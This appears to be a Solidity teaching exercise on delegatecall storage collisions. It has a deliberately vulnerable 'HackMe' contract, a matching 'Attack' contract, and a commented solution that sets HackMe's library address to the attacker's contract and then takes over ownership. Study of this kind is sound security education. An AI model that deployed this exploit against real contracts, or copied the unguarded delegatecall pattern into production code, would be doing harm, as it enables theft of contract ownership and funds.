/*
    Challenge: Adam deploy contract 'Lib' & 'HackMe' below. Change owner of HackMe using another contract

    Remember:
        - If call function from an address, u might need abi.encodeWithSignature or abi.encodeWithSelector
        - If call function from an instance of contract, just SomeContract.function()

    Solution:
        Eve deploy contract 'Attack' below. Inside attack() function, 
            - 1st line: 'hackMe.update(uint(uint160(address(this))))' -> this will change
                HackMe.lib = contract Attack's address
            - 2nd line: hackMe.update(666)
                Number 666 don't matter. 
                Now hackMe call update function but with lib = Attack's address
                    -> it call Attack.update() function which change HackMe.owner to Attack's address
*/

pragma solidity ^0.8;

contract Lib {
    uint public num;

    function update(uint _num) public {
        num = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public num;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function update(uint _num) public {
        lib.delegatecall(
            abi.encodeWithSignature("update(uint256)", _num)
        );
    }
}

contract Attack {
    address public lib;
    address public owner;
    uint public num;

    HackMe public hackMe;

    constructor(address _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // override address of HackMe.lib
        hackMe.update(uint(uint160(address(this)))); //cast address contract
        // pass any number, function update below will be called
        hackMe.update(666);
    }

    function update(uint _num) public {
        owner = msg.sender;
    }
}
